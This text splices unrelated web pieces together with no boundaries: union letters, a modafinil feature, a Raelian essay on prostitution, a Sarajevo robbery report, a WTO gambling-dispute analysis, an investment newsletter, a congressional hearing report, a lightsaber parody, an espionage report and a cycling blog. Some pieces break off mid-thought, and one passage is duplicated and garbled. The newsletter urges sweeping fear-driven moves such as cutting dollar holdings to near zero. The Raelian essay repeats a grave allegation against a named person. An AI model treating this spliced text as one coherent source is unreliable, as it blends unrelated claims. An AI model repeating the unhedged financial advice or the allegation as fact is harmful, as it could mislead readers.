I recall it looking like a xerox of a mimeograph , so it 's probably even quite a bit older than that .
It 's a long toothed joke in technical jobs , and I now pass it on , sometimes giving it to my service desk students in a occasional moment of levity .
Vann Hall says ,
And in contrast to Hutton 's image of a union movement reduced to a public - sector rump , the bulk of the RMT 's membership is actually in privatised companies .
In the face of Gordon Brown 's demand that public - sector workers accept real pay cuts , many union activists look increasingly at the RMT 's militancy as a source of inspiration rather than scorn .

Bob Crow and his ilk are failing the British worker as well as the noble heritage of trade unionism .
Most British people would like to see a functioning , humane , mixed economy that neither sanctioned egregious inequality nor destroyed incentive .
Unionism is essential to the delivery of this , yet , thanks to Crow and his like , it remains a derided , marginalised and largely irrelevant force .
For most Londoners , the only time they will get to see , hear of or experience trade unionism is when they 're unable to go about their daily business as a result of some generally obscure complaint from a set of seemingly well - remunerated workers .
This is profoundly sad .

The London tube workers balloted democratically for their recent strike to protect their pension rights with the collapse of Metronet , as Will Hutton rightly pointed out .
Yet your columnist went on to berate Bob Crow for being a former communist and then attack Crow and the RMT for not being more like the Chinese Communist party .
Hutton praises Deng , who oversaw the Tiananmen Square massacre , as a ' visionary reformer ' .
Amnesty International and others have reported that human - rights abuses in China got worse under Deng Xiaoping and have kept getting worse since .
If Will Hutton really thinks this is the kind of change we need in Britain , he 's 100 per cent wrong .
He says we should n't go back to the 1980s - but the Chinese model would take this country back to the 1880s .

Will Hutton once wrote in a book that the long jihad against the unions needed to come to an end .
But not yet , it would seem .
Britain remains one of the most unequal societies in the world .
I work for state - subsidised First Group , which is doing very nicely , so The Observer informs me .
However , I am a graduate earning less money - about £ 225 a week - now than I was nine years ago .

I 'd hazard a guess that the members of the RMT who won ' slightly tougher assurances ' ( to quote Will Hutton 's begrudging phrase ) are likely to be feeling more full of ' vitalism ' than they were when Metronet collapsed , throwing their future working conditions , rights and pension entitlements into uncertainty .
While some may remain hostile , we have seen that successful collective action by the workforce is a key element in enriching the working experience .
It also has the effect of making the world seem that little bit fairer .
Whether lofty wordplay about ' vitality ' , ' enrichment ' , ' good work ' and ' stakeholding ' from eminent professors and newspaper columnists can provide a more successful hook on which the unions can finally hang up their disputatious tendencies remains more open to doubt .
So maybe for now - and for fairness - it 's still ' Come on , brothers ' .

SO MUCH to do , so little time .
Between a hectic work schedule and a thriving social life , Yves ( not his real name ) , a 31 - year - old software developer from Seattle , often does n’t have time for a full night ’s sleep .
So he swallows something to make sure he does n’t need one .
“ If I take a dose just before I go to bed , I can wake up after 4 or 5 hours and feel refreshed , ” he says .
“ The alarm goes off and I ’m like , let ’s go ! ”
Yves is talking about modafinil , a stimulant that since its launch seven years ago has acquired a near - mythical reputation for wiring you awake without the jitters , euphoria and eventual crash that come after caffeine or amphetamines .
Yves has been popping modafinil on and off for the past three years and says it is “ tremendously useful ” .
“ I find I can be very productive at work , ” he says .
“ I ’m more organised and more motivated .
And it means I can go out partying on a Friday night and still go skiing early on Saturday morning . ”
Modafinil is just the first of a wave of new lifestyle drugs that promise to do for sleep what the contraceptive pill did for sex – unshackle it from nature .
Since time immemorial , humans have structured their lives around sleep .
In the near future , we will , for the first time , be able to significantly structure the way we sleep to suit our lifestyles .
“ The more we understand about the body ’s 24 - hour clock the more we will be able to override it , ” says Russell Foster , a circadian biologist at Imperial College London .

our support to Las Vegas ' Mayor
The Mayor of Las Vegas , Nv , recently gave up on pushing for the legalization of prostitution in this city which is among the most famous for allowing so many other things – most all of them infinitely more destructive than sex !
( Gambling and alcohol destroy many times more lives than protected sex ! )
While the mayor himself believes it should be legalized , there are still enough outspoken people against legalized prostitution for “ moral reasons ” .
A new book released by the San Francisco - based group " Prostitution Research and Education " even claims all prostitution is a " human rights violation ” .
This would only be true in cases where women are forced into prostitution .
It should be noted that 99 % of the time , it is men who force women into this terrible practice – men who have antiquated , primitive belief systems which define women as belonging to a man .
The Raelian movement ’s position is that if a woman ( or man ) wishes to go into this business , which brings pleasure to other people , it is a direct violation of their rights if we do n’t allow them to .
Besides , prohibiting anything never works .
Rael reminded us in this article that ‘ some people prostitute their brain as intellectual workers , or their hands as factory workers , and it is all prostitution .
As long as money exists there will be people doing things for money .
They can do it working with their hands , brain , sex or singing , as long as they do it for money it is prostitution .
’Las Vegas is considered quite a liberal city .
It is even often called “ sin city ” by the US populace , who like to think the US is far more advanced when it comes to morality than other countries .
But is this really the case ?
First of all , it took about 150 years for the US , the country based on equality , to even allow women or blacks ( or any other race than white ) to vote .
So even if the US is a little ahead of those countries in 2007 which allow the stoning of women for “ violations of honor ” , this by no means makes the US the authority on women ’s rights .
The US has so much further to go before women are no longer demonized / harlotized as Western religion has done to them .
The US is saying “ we allow our women to wear something other than a burka so we are more liberated ” .
It ’s like saying “ I am better because I only killed 10 people because you killed 20 . ”
It ’s like saying the Koran is a violent book while the Bible uses the word “ war ” over 300 times , the word “ sword ” used even more , and claiming that God is loving while this god is reported in “ his own book ” to have killed over 2.2 million people .
( BTW : Satan only killed 10 according to god ’s own book )
How can Christians who believe every word of the Bible claim they really understand and are committed to peace ?
How many can say they are truly committed to equality between men and women when that book also says we should stone adulterers ?
The current “ official ” view in the US is that prostitution , sex out of wedlock , gay sex etc. is immoral .
But wait !
That ’s exactly the same as those allegedly “ backward ” countries Bush and Cheney led the US to attack under the lie of spreading equality and freedom .
Bush ’s presidential elections were even won under the guise of bringing “ dignity and morality back to the White House ” !
To this writer , and I was born and raised in the US , the list of scandals from the pious Bush administration is much , much more immoral .
To list just a few : The US Attorney General ( A. Gonzales ) lies in order to protect his political party , Bush trying to appoint Harriet Meiers ( a Methodist University graduate ) as Chief Justice of the Supreme Court knowing perfectly her stance against abortion , then appointing John Roberts instead , ( just as anti-abortion as Meiers ) .
Let ’s also not forget his appointing Dr. Hagar ( gynecologist and evangelical Christian ) whose ex-wife said that he repeatedly anally raped her in her sleep to the FDA advisory board on women ’s reproductive issues .
Evangelicals and an alleged rapist deciding women ’s rights ?
Sounds an awful lot like the “ extremists ” Bush claims to be fighting against , does it not ?
And what could be more immoral than the killing of hundreds of thousands of innocent Iraqis ?
 We in the Raelian Movement are sure that Jesus would not agree with this .
Nor would They Who send Him as well as Rael , The Elohim .
We have to stop grading on a curve .
When compared to The Elohim ’s society , one country on Earth is only slightly ahead or behind the next .
We must call our society what it is .
Primitive .
Violent .
Oppressive .
The Elohim give very clear advice to help us emerge from such Dark Age mentality while giving us the complete freedom to ignore this advice .
This is real love they show us .
This is freedom in its purest form .
Our Creators let us decide for ourselves .
The Elohim would certainly have the right to come and say “ you must do this …do that .. ”
But they do n’t .
They do n’t force us to do anything , which is exactly what we should do with our own citizens – not imposing our morality upon others who do not agree with us .
For almost 34 years , the Prophet Rael has been teaching that sex is healthy – very healthy and that as long as 2 ( or more ! ! ) adults are consenting , they should do it without hesitation or guilt .
You may want to read also this other article were Rael comments quite clearly and beautifully on prostitution in Africa .

And like the great US comedian George Carlin pointed out , “ Sex is legal .
Selling is legal .
So why is n’t selling sex legal ? ! ”

SARAJEVO ( Reuters ) -
Two armed men disguised as Muslim women in burqas held up a bank in Sarajevo and got away with some $ 40,000 , Bosnian police said on Tuesday .
They said the pair entered a Union bank branch in the capital wearing head - to - toe black dresses and veils typical of women adhering to the orthodox Islamic code and trained guns on customers .
They then made customers lie on the floor while the emptied the tills , police added .
“ Everything happened in a moment .
Two persons in black niqabs ( burqas ) came into the bank .
I thought they were ladies , ” the Sarajevo daily Oslobodjenje quoted bank customer Mehmedalija Komarac as saying .
Women in burqas and men with long beards have become a common sight in the Bosnian capital in recent years .
Analysis Antigua yesterday filed for formal trade sanctions against the United States , demanding $ 3.4 billion in compensation from the truculent , recalcitrant super power for failing to open its domestic market to remote gambling services .
Antigua , as expected , was not alone ; the hottest online gaming market in the world , the EU , also filed for sanctions .
Antigua has been embroiled in a four year battle with the US over the provision of remote gambling services , and the WTO has repeatedly ruled against the US , in increasingly stern terms .
After the US tried to insist to the WTO that it had brought itself into compliance without doing anything at all – a novel argument that riled the WTO compliance panel – the WTO issued a definitive and far reaching ruling in favor of Antigua , opening the door for sanctions for the tiny Caribbean country that has seen one of its principal industries pummeled repeatedly by the American Department of Justice ( DOJ ) .
The rules of the WTO typically provide for traditional tit - for - tat trade sanctions , but for tiny countries like Antigua that depend heavily on imports , such an approach can be economically devastating , while doing virtually nothing to penalize the offending nation .
The WTO thereby provides an alternative ; countries may suspend their own obligations to the offending country .
Antigua thus could sell unlicensed copies of American movies or software , for example , to compensate itself for losses resulting from the American actions .
Although gambling is the kind of allegedly trivial activity that inspires strong reactions in many people , important principles of international law and trade are at stake : just what kind of internet do we want , and to what extent can one country pick up its proverbial marbles and go home when trade disputes go bad ?
Do we want the freewheeling internet that characterized its early years , or a tightly regulated and controlled internet , subject to the prosecutorial whims of the administration of the day ?
Regardless of what one thinks of gambling and gamblers , just how far should American police jurisdiction really go ?
The United States Trade Representative ’s ( USTR ) has taken a similar hard line position to that of the DOJ , and it ’s clear from the American arguments in front of the WTO that the two have been working in concert on this case .
Not surprising , since this dispute has revolved around American criminal law and how it impacts internet gambling .
What is surprising is the extent to which the USTR seems willing to abandon the decades of hard - fought negotiations covering the international trade in services that ultimately resulted in the General Agreement on Trade in Services ( GATS ) for a policy ultimately damaging to American trade interests .
The USTR , after pretending the US did n’t really know what it was doing when it failed to exempt gambling services from its schedule of commitments ( countries are allowed to exempt “ immoral ” services or products , but cannot discriminate in doing so ) , and repeatedly getting hammered by the Antiguans , has decided to redefine its GATS commitments to eliminate gambling services , thereby opening the door for other WTO members to do the same .
It ’s not hard to understand how such an approach may quickly render international agreements worth less than the paper they are printed on .
And so , today , what is expected to become a parade of countries demanding sanctions against the United States as a result of its refusal to comply with WTO rulings on gambling services began to form , as Japan and India piled it on with more demands for compensation .
Every other signatory affected will have a right to demand sanctions , and those sanctions may , depending on the circumstances , be applied against any American industry , from automobiles to semiconductors .
Perhaps this is just a game of chicken by the USTR , a kind of unilateralist posturing , although that seems hard to believe considering the floundering state of the current DOHA round of negotiations ; just where the WTO goes from here , no one really knows . ®

MONTE CARLO , Monaco ( IHSL ) --
For years , greed has been the underlying force in the markets .
Now fear is replacing it .
Once underway , fear is an even stronger force .
While central banks try to hose down the market 's fear - flames with money , it does n't change the liquidity problem .
Lenders fear to lend and borrowers fear to borrow .
Money " in the system " is of no real help .
Someone has to borrow it .
Who will ?
“ The modern financial world runs on credit , so if fear rises to a level where fewer are willing to lend -- and fewer are brave enough to borrow -- the situation can get a lot worse before it starts improving . ”
We 're back to being unable to push a string .
We 're into the very early beginnings of the unwinding of the derivatives hurricane long forecast by Jim Sinclair ( jsmineset.com ) and myself .
Only the innocent will fall for the line that two failed funds from Bear Sterns BSC , - 10.00 % and one European bank fund were the only real problem , which caused the main central banks to massively push money into play , and repeat it and repeat it .
Shallow thinking .
Into play they hope .
The money just sits there waiting , hoping , to be used .
The modern financial world runs on credit , so if fear rises to a level where fewer are willing to lend -- and fewer are brave enough to borrow -- the situation can get a lot worse before it starts improving .
In my opinion , we 've entered that twilight zone and it will get worse and we 'll see a torrent of foreclosures over next 12 to 24 months .
The " other shoe " will be falling for a long time , so investors should stop waiting for the markets to " calm down . "
Instead , they should fix the roof of their financial houses .
Among things to do :
Assume the worst scenario is possible and plan for it .
If it does n't reach that stage , you wo n't have lost traction but bought yourself peace of mind and financial insurance .
If you own the high yield currencies ( I do ) , switch partially to low yielders for now .
My favorite is the Swiss franc .
Pays near zero interest but chart is bullish , so should give you capital gain .
See currencies .
Worry about banks ( all of them ) .
Time deposits , even current accounts , in Europe , U.S. , Canada and Asia banks are at risk if the bank goes under or takes a " bank holiday " ( 1933 ) .
The only things safe from bankruptcy to keep in a bank are : gold bullion ( if in your own safe box ) , stocks and bonds .
Stocks and bonds are kept in safe custody accounts so they are ok if your bank tanks .
( Some world banks have insurance , but it 's under $ 12,000 .
In the U.S. , FDIC insurance is $ 100,000 , which is nice but not sufficient for most middle income citizens , nor is it immediately payable in most cases .
Additionally , not all US banks have FDIC insurance . )
Cut your stock positions down if you are too heavy there and / or use stops .
Hold mainly oil , natural gas , base metals and precious metals .
In general stocks , stay with big , big caps .
Reduce your U.S. dollars to near zero on the present rally , which should move up ( on the U.S. Dollar Index ) to 83 before topping .
There is much more to say but no time remains to say it .
I close with this :
From fear we 're morphing into panic .
The able George Magnus of UBS UBS , - 0.54 % says the " Minsky moment " is coming , when credit dries up even to sound borrowers .
Only panic is left .
I hope this scares you into doing something , even though it most certainly wo n't be enough .
Bon chance .
Good luck .

Goodling : Being a Republican helps in getting hired at the Justice Department Michael Roston
Published : Wednesday May 23 , 2007 Print This Email This
In the afternoon session of a hearing before the House Judiciary Committee , the Justice Department 's former White House Liaison admitted that self - acknowledged Republicans had a better chance of getting hired by her for non-political openings at the Justice Department .
In questioning by Rep. Tom Feeney ( R- FL ) , Goodling added more details to her statements in the morning session acknowledged that she frequently interviewed people who sought political and career appointments simultaneously .
When she did n't have political slots open , she would then direct them to career postings .
" I would interview them as if they were a political appointee , but if I did n't have a political position I could recommend them for , then I would pass their resumes on to people for consideration for career positions , " she explained .
She added , " Sometimes if I interviewed people , even if I was n't trying to ask a political question , they 'd just self - disclose because they knew I was a Republican , and they figured it would help them get the job , I assume .
Sometimes people just self - disclose that kind of information to me , and the same thing occurred when I did reference calls .
There were times I crossed the line probably in my reference calls by asking , but there were other times I did n't and people just would volunteer the information . "
She went on , " I 'm not going to sit here and tell the committee that I could completely exclude it from my brain , sometimes I just knew where they were coming from and I can't say that it did n't play a factor in what I thought about someone .
I 'm just being honest .
Sometimes it helps them . "
Rep. Feeney attempted to suggest that the same thing had occurred under Democratic administrations .
" Did you have any understanding of how the previous Justice Department worked under President Clinton ? " he asked .
Goodling answered that she did n't know .
A video clip of the exchange from CNN Pipeline is presented below : Former aide says Gonzales gave erroneous testimony In subsequent questioning with Rep. Artur Davis ( D - GA ) , who recently co-sponsored a ' no confidence ' motion for the Attorney General , a parliamentary melee broke out as Goodling was asked if the Attorney General had given incomplete testimony with regard to his knowledge of the list of US Attorneys who were set to be fired and her attorney attempted to intervene .
Asked if it was accurate that Gonzales " never saw the US Attorneys list , " Goodling responded , " I believe he saw a list , " and then affirmed that " it would be inaccurate testimony . "
She also said Gonzales 's testimony that he had not been briefed on the firings was not accurate , and that Gonzales was present at a Nov. 27 meeting .
But when she tried to suggest that the Attorney General 's inaccurate remarks occurred only in the context of a press conference , not in testimony , her attorney , John Dowd , stood up to say he needed to speak with Goodling , and Rep .
Davis told him to sit down because he was not a witness at the hearing , but only counsel to the former Justice Department aide .
Rep. Dan Lungren ( R - CA ) objected to Davis 's action , and the hearing was disrupted as a series of parliamentary procedures ensued as the Congress members attempted to sort out the appropriate procedure .
When a ' motion to table ' Lungren 's objection succeeded , Davis resumed his questioning .
Goodling had noted that as the controversy deepened , she asked the Attorney General if should be transferred out of his office , prior to her resignation .
At this moment , she said the Attorney General began discussing details of the US Attorneys controversy with her .
" He laid out for her me some of his general recollections ... of some of the process for the replacing of the US Attorneys , " she said .
" He asked me if I had any reaction to his iteration , and I remember thinking at that point that this was something we were all going to have to talk about , I did n't know if it was maybe appropriate to talk about that at that point , and as far as I remember , I just did n't respond . "
The Attorney General has stated on multiple occasions in testimony before the House and the Senate Judiciary Committees that he is unable to answer certain questions because the ongoing internal investigation by the Office of Professional Responsibility and the office of the Inspector General prevent him from consulting his staff on the firing of the US Attorneys .
House Republicans joke with Goodling about her tenure
After a lengthy recess for votes on the House floor , the Judiciary Committee gave both the Republican and Democrats on the committee 15 minutes to ask their final questions .
The House 's Republicans focused on whether or not Goodling had been biased in her hiring practices .
Rep. Lungren asked Goodling if she would say membership in the conservative legal group , the Federalist Society , affected her personnel decisions .
She answered in the negative .
Rep. Chris Cannon , ranking Republican of the subcommittee that has issued the subpoenas in the US Attorneys investigation , then joked with Goolding about her membership in another legal group .
" Following up on the Federalist Society , I note that you 've been a long - standing member of that left - leaning organization the ' American Bar Association , ' " Cannon said .
Goodling answered , " I 've been a member of the American Bar Association longer than I 've been a member of the Federalist Society . "
Cannon then asked , " Has that impeded your career at the Justice Department ? " to laughs in the chamber .
A smiling Goodling answered , " It has n't seemed to , at least while I was there . "
Cannon then summed up his view of the entire hearing .
" Ms. Goodling , we 're done on our side , pretty much ... Mr. Schiff I think is going to take the time from here , you 've got 15 more grueling minutes , and we 'll see if he can come up with something worthy of the hours and hours that we 've spent on this subject up until now , " the Utah Republican remarked .
In a post - hearing press conference , the committee 's chairman , Rep. John Conyers ( D - MI ) , differed with Cannon .
" It seems that there are possible obstruction of justice and perjury charges , " he said , referring to how Goodling 's testimony interacted with prior statements by Deputy Attorney General Paul McNulty and former Justice Department Chief of Staff D. Kyle Sampson .
" So , I think it is presumptuous of Judiciary Committee members to say that we should go home . "

Peek inside the lightsaber .
HowStuffWorks
The art of lightsaber construction , like many things in life , generally passes down by word of mouth from Jedi Knights and Jedi Masters to their young Padawan learners .
Oh sure , there are pamphlets and educational films , but there 's no substitute for experience when creating a shaft of brilliant plasma .
If you do n't know a Jedi Master , do n't fret :
They also manufacture the weapons in China .
Crack open any two lightsaber hilts and the interiors may differ somewhat , but the key features are remarkably consistent across lightsabers .
In each , you 'll find the major components that follow .

diatium power cell -- a device no larger than a roll of coins .
You 've probably noticed these cells at your local grocery store , though you generally have to ask a clerk for access .
Much like the average iPhone , lightsabers are powerful devices that require vast amounts of energy .
Any device that can melt through a blast door obviously requires access to tremendous energy reserves .
The source of this energy is a-- a device no larger than a roll of coins .
You 've probably noticed these cells at your local grocery store , though you generally have to ask a clerk for access .
Surrounding the power cell is a power field conductor and the power vortex ring .
These two devices work together to move the available energy toward the energy gate , which in turn controls the flow of energy into the crystal energy chamber .
The crystal energy chamber is the heart of any lightsaber , and the chamber depends on at least two crystals , each with its own specific role .
The primary crystal converts the energy from the power cell and transfers it to one or more focusing crystals , held in place by the focusing crystal activator .
If these two crystals are n't aligned perfectly , the lightsaber will detonate the moment you activate it -- so never buy a used one from a partially exploded man .
The energy channel generates the lightsaber blade itself .
Energy flows from the crystal energy chamber and then converts into the arc wave that makes up the blade .
The arc wave flows up through the blade energy channel and past the cycling field energizers .
The refined arc wave makes its way to the blade arc tip and from there becomes visible as the glowing blade of the lightsaber that 's so familiar .
The blade 's color depends on your choice in crystal , so be sure to shop around if building your own .
Most lightsaberists prefer a traditional blue or red blade , but particularly trendy Jedi have been known to employ a whole rainbow of deadly hues .
So , the next time you slay a snow monster or warm up a cup of coffee with your trusty Jedi melee weapon , take a moment to think about all the technology that makes it possible .
Author 's Note : How Lightsabers
Work
I grew up with Star Wars and brandished many a flashlight as my own make - believe lightsaber , but it ’s one of those fantastic sci- fi inventions that I never stopped loving .
I played an unhealthy amount of “ Star Wars Jedi Knight II : Jedi Outcast ” the summer of 2002 , and while I groaned as much as the next fan about the prequel trilogy , the lightsaber duels themselves delivered big time .
I even watched a few of them again for this article , and for a good half - hour there I was 8 again , rooting on my favorite Sith Lords .
Yeah , I was one of those kids .
" How Lightsabers Work " was one of the first HowStuffWorks articles I read , long before I actually joined the editorial team .
So , when the opportunity came up to work with this article and add my own name to the byline , I jumped at the chance .
Dozens of new lightsaber styles have entered service since this article initially published , but the " science " still holds up nicely .

The two allegedly stole microchip designs with possible military uses
US citizen Lee Lan and Chinese national Ge Yuefei are accused of stealing computer chip designs from their employer Netlogics Microsystems .
The two are alleged to have formed a company to develop chips based on the stolen designs .
They then contacted the Chinese army to sell the chips , prosecutors said .
' Economic espionage '
Their indictment also alleges they stole documents from Taiwan Semiconductor Manufacturing Corporation , which has an office in California 's Silicon Valley .
The two companies design and make microchips and processors for use in networking equipment with possible military uses .
Mr Lee and Mr
Ge have each been charged with two counts of economic espionage , two counts of theft of trade secrets and one count of conspiracy .
They face up to 15 years in prison if convicted .

Only three other people in the US have been convicted of economic espionage - stealing trade secrets to benefit a foreign government .
All three cases were related to computer parts or software in Silicon Valley outside San Francisco .
There are lots of reasons for you to be commuting by bicycle , but many of you who could cycle to work are still burning expensive gasoline to get there .
What ’s it going to take to get you out of that expensive car and onto a high - precision , environment - friendly , health - enhancing bicycle ?
How about some money ?
Not just gas money , either .
Read on .
This post might change your life in a dozen healthy and bank - account enhancing ways .
More than half of Americans live less than 5 miles from the place where they work .
That ’s easy striking range for a bicycle .
Studies have shown that trips of less than 3 miles are often quicker by bike , and urban trips of 5 to 7 miles usually take about the same time .
Here are more statistics to consider :
According to the Nationwide Personal Transportation Survey , 25 percent of all trips are made within a mile of the home , 40 percent of all trips are within two miles of the home , and 50 percent of the working population commutes five miles or less to work .
Yet more than 82 percent of trips five miles or less are made by personal motor vehicle .
I ’m one of the many people who live about five - miles from my place of employment .
Traveling five miles to work takes me only about 25 minutes .
This is only about 10 minutes more than it would take to drive to work in good traffic .
I have commuted to work by bicycle since 1998 .
Making the change from car to bike seemed so difficult and intimidating , until I made the change .
Looking back , I wonder why it seemed like such a difficult decision .
[ My trusty Trek 7900 .
I purchased it 5 years ago for $ 500 ]
I admit that cycling to work is not for everyone .
Many people live long distances from their place of work .
Many people need to transport several children or heavy equipment every morning and evening .
Some people really do have physical limitations that make bicycle commuting impossible .
But chances are that many of you who are reading this do n’t fall into any of these categories .
Many millions of Americans are terrific candidates for bicycle commuting .
Some of you can even combine use of a bicycle with public transportation , stretching your transportation access across your city .
Where I live , for example ( in St. Louis , Missouri ) , you can roll your bicycle onto a light rail train or place it on a rack in the front of a public bus .
This has allowed me to quickly “ bicycle commute ” to places 10 or 15 - miles away from my home .
I ’ve tried to anticipate many excuses for not cycling to work .
People who having tried bicycle commuting yet will resist the thought .
Many of you just do n’t want to consider this healthy and cost - saving change .
Why ?
Because it ’s a change . . .
Check out these lists of responses to the most common excuses for not commuting by bicycle , here and here
As you can see , they ’ve anticipated your main concerns .
BTW , there are TONS of good bicycle websites out there .
You have no excuse for lacking information on how to buy a bike , how to repair it and how to enjoy it .
I started commuting by bicycle because I was compelled to work especially long stressful hours for several months straight .
After several weeks of this crushing work , it became apparent that I was not getting enough exercise and that I was feeling over - anxious while sitting at my desk .
I decided to run an experiment one morning : I hopped on my bicycle and rode to work for the first time .
It felt a little strange and I felt out of place rolling up to my office building on a bicycle — it even felt a bit embarrassing .
After all , this is not how most people who work in office buildings get to work .
Not in a conservative city of the American Mid-West , anyway .
I quickly got used to this change , though .
I have been commuting by bicycle ever since .
In fact , when I die , they will have trouble prying my handlebars from my cold dead fingers .
Statistics show that only 2 % of Americans take the opportunity to commute by bicycle .
Here ’s another interesting bicycle statistic : Nineteen percent of those who rode their bicycles to work reported that their commute was the most pleasant activity of their day .
In contrast , only two percent of workers who drove to work liked that part of their day .
The advantages to commuting by bicycle are numerous .
The exercise of cycling to work lowers your stress level at work .
You will find that you no longer need to make time to exercise , because you will be building your exercise into your day , making exercise a natural and sustainable part of your life .
Oh , yes .
I promised to tell you how to make money by commuting on a bicycle . . .
If I walked up and handed you $ 200 would you consider that to be a significant sum of money ?
Of course you would .
You ’ll save significant money by cycling to work .
You ’ll no longer need to purchase gasoline for your work commute .
I ’ve calculated that I save at least $ 200 per year in gasoline costs because use a bicycle instead of a car .
Imagine filling two gallon - sized milk cartons with gasoline every week .
I save that much gas every week , even though I drive an efficient car that gets almost 30 mpg .
You might save much more than that .
Using your car less often will result in other cost savings : fewer car repairs , fewer oil changes and possibly a discount on your auto insurance ( based on a smaller number of commute miles you ’ll need to report ) .
But there ’s even more .
You can cancel that expensive health club membership , because you ’ll be getting great exercise while you travel to work .
If your employer pays for your work - related parking , consider relinquishing those privileges in exchange for cash ; why would your employer care whether it pays your “ garage ” money to you directly ?
I did that for years at my previous employer , thereby “ earning ” more than $ 1000 per year .
If you pay a daily fee to park your car , it ’s even easier ; every day you hop on a bike and pedal to work , it ’s like you just paid your self the amount that you would have paid to park your car ( at $ 10 / day , that adds up to $ 2,500 / year ) .
And here ’s another thing to consider : because you ’re much less stressed after cycling to work , you can quit seeing that expensive therapist so often .
Free mobile meditation time !
Here ’s another thing to bank on : if there is a God , I have no doubt that He / She approves of you riding your bike .
At least you ’ll never find anything about driving a car in the Bible . . .
When you start commuting by bicycle , you might encounter some minor obstacles .
For instance , when I was hired at my current job , the manager of the large office building told me that no bicycles were allowed in the building , including in the parking garage .
In other words , the official policy was to allow large pollution - producing machines in the garage , but not an environmentally - friendly bicycle .
I solved that problem by simply talking to a person in charge of the garage .
He invited me to ignore the official policy and I now lock up my bike next to a stairway in the corner of the garage .
You might hear similar silliness .
Do n’t be deterred !
If you ’re new to bicycle commuting , there are various approaches to changing clothes when you get to work .
Here are some ideas on changing into work clothes .
I highly recommend not riding to work in a business suit , especially when it comes to long commutes in hot weather .
Rather , take your clothes with you in a backpack or in bicycle panniers ( bags that hook onto the rear rack of a bicycle ) .
When you roll up your clothes , they really do n’t get wrinkled .
Amazing little trick !
A lot of people assume that you need to take a shower when you get the work .
I find that taking a shower before I start my commute works great , at least for my 5 - mile distance .
For insurance , use deodorant , but smell has never been an issue with me —yes , I ’ve asked my co-workers !
When I arrive at work , I use a towel to quickly dry off , hitting my hair quickly to avoid “ helmet head hair . ”
I usually cool down while looking through my mail .
I ’m lucky to have my own office , so I simply close my door while I ’m cooling down and I eventually change into work clothes .
I admit that on some occasions I do n’t actually cycle to work .
For instance , I sometimes need to appear in court wearing a suit ( I ’m an attorney ) .
On those days , I often drive to court .
I also avoid riding when there ’s ice or snow on the ground .
There are many people who are braver than I am in this respect .
In fact , there are bicycle websites from some of the colder states where people excel on riding bikes on ice and snow .
I suspect that co-author Grumpypilgrim will supplement this post with a few of those sites where the authors even give advice on how to ride when it ’s less than 20° , less than zero or less than 10 below .
That kind of talk amazes me .
It makes my toes feel frozen just thinking about it .
On the other hand , I will ride a bike whenever the high temperature is at least going to be somewhere in the 20s .
In many cities , most days qualify .
The trick is to dress in layers .
It really works .
There are also some special gloves and head coverings that keep you warm when others can’t believe you ’re out there on a bicycle .
Oh , yeah . . .
“ But what if it rains ? ”
Here ’s a little secret .
It wo n’t rain .
Ignore those “ 60 % chance of showers ” forecasts .
For those times when it really rains , you ’ll get wet .
Big deal .
Get a cheap riding poncho and have a towel ready at work .
Here ’s the real trick .
Every morning , assume that you ’re going to ride your bike to work .
Know that you will ride unless there is a great excuse not to ride .
Do n’t wake up wondering whether you should ride to work .
Yes , you ’re tired .
You stayed up too late last night , you think your bones hurt and you ’d rather hop in that gas - guzzling monster and listen to your expensive car radio , you think .
Once you ’re on the road on your bicycle , though , you ’ll feel the breeze and you ’ll see and hear sights and sounds of real people .
You ’ll be energizing and tuning your muscles so that when you ’re on foot later that day , you ’ll bound up stairways , ahead of all of those slow grunting people who fell to the temptation of gasoline .
When many of those high - stress car - sitting - overweight - lazy - arterial - plaque - laden types are hospitalized for their strokes and heart attacks someday , you ’ll still be zooming around with your muscle - powered high - precision two - wheeled rocket .
Is n’t this alone a great reason to join the ranks of the ecologically - friendly road warriors ?
Some people think that riding a bicycle requires the purchase of expensive equipment .
Not true .
A brand - new quality bicycle can be bought for about $ 350 at a bike shop .
If you want to really load up your bike with accessories , you can pay another $ 350 .
Common accessories might include a high - quality light for night riding , panniers , odometer / speedometer , bike lock and helmet .
Do n’t forget the helmet !
Alternatively , there are many people out there whose garages contain un-utilized bicycles .
Ask your neighbors and friends if they want to sell a bike .
Probably every other adult in the country has a used bike they ’re willing to sell cheap .
If it ’s not in perfect shape , take it to a bicycle shop for a tune - up or learn to do this yourself by referring to one of the many great bicycle repair sites on the Internet ( e.g. , see here or here ) .
Do n’t be intimidated about buying a new bike .
Just go to your neighborhood bike shop , do some test riding and buy yourself a name - brand bike .
There are several styles available ( mountain , road bikes or hybrids ) and they are all far better ( and almost always cheaper ) than anything you could have bought 20 years ago .
The main caveat on buying a bicycle is to avoid cheap bicycles sold by stores such as Kmart .
You find that these big store bicycles are not nearly the quality as bicycle shop bikes and they tend to be rather heavy , which can affect your enjoyment of your ride .
Here are some other tips on bike equipment .
The bottom line on bike expenses is this .
If your car needed a $ 500 repair , you ’d just do it .
After all , it ’s your transportation , you ’d think .
Compared to the suction that cars do to your bank account , bicycles and bicycle repairs are laughably cheap .
Think of your bicycle as your transportation and the costs of owning / operating / repairing your bike come into context .
I do much of my commuting in the dark , especially in the winter .
For those of you who want to ride at night , please remember that unless you take serious precautions , you will be entirely invisible to the people driving motor vehicles .
Therefore , I recommend several measures .
First of all , wear reflective clothing .
Make sure your bike has reflectors on the back and front .
In fact , I would n’t feel safe riding a bicycle without high - quality lights on the front and back .
Decent quality taillights can be bought for $ 25 or more .
To get a real headlight , however , you will need to spend at least $ 100 .
I ’ve use lighting products manufactured by a company called Niterider .
These are top quality lights that cost about $ 300 .
Luckily , lighting technology is improving month to month , and new lower - priced higher - efficiency lights are constantly entering the market .
Keep in mind that you might not need lighting equipment unless you plan to ride in the dark .
I probably ride 500 miles per year in the dark , sharing some busy roads with motor vehicles .
For me , then , there is no option .
One more thing about riding in the dark .
On those nights when I need to work especially late , I experience a special treat riding home .
Clean crisp night air fills the quiet city after the fossil - fuel commuters are long gone .
The breeze is magic and , as you sail through that quietude , you too will think magic thoughts .
Safety should be a huge concern for those riding bicycles .
You are extremely vulnerable out there , mixing it up with speeding vehicles made of heavy metal .
You need to constantly operate your bicycle with the assumption that someone will not see you , even in the daytime .
You should assume that cars will occasionally do boneheaded things like suddenly turning in front of you .
On the other hand , I have been delighted with the number of motorists who recognize that I am out there and who consider my safety needs .
In almost ten years , I ’ve traveled almost 13,000 miles , without an accident .
I try to return that consideration by obeying the traffic laws ( bicyclists riding on public streets are required to obey the traffic laws ) .
In almost ten years of riding , I have had thousands of motorists respect my right to share the road with them .
This does n’t mean that I hog a single lane of traffic , however , holding up dozens of cars .
Bicycles are much slower than cars ( usually ) , and I do n’t want to make enemies .
